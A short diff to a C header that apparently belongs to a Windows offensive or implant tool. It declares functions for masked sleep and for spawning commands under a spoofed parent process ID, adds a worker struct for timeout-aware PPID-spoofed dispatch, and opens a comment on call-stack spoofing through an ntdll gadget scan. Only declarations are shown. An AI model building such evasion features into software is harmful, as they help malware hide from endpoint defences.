@@ -13,6 +13,10 @@ void sleep_masked(DWORD ms);
 /* Spawn cmd with parent_name as spoofed PPID. Returns 1 on success. */
 int spawn_with_ppid(const char *cmd, const char *parent_name);
 
+/* Thread worker + shared struct for safe (timeout-aware) PPID dispatch */
+typedef struct { char cmd[512]; char parent[128]; int ok; } PpidWork;
+DWORD WINAPI ppid_worker(LPVOID arg);
+
 /* ── Phase 10: Call-stack spoofing via ntdll gadget scan ─────────────────
  *
  * 110-byte spoofed stubs plant a call-preceded RET address from ntdll at
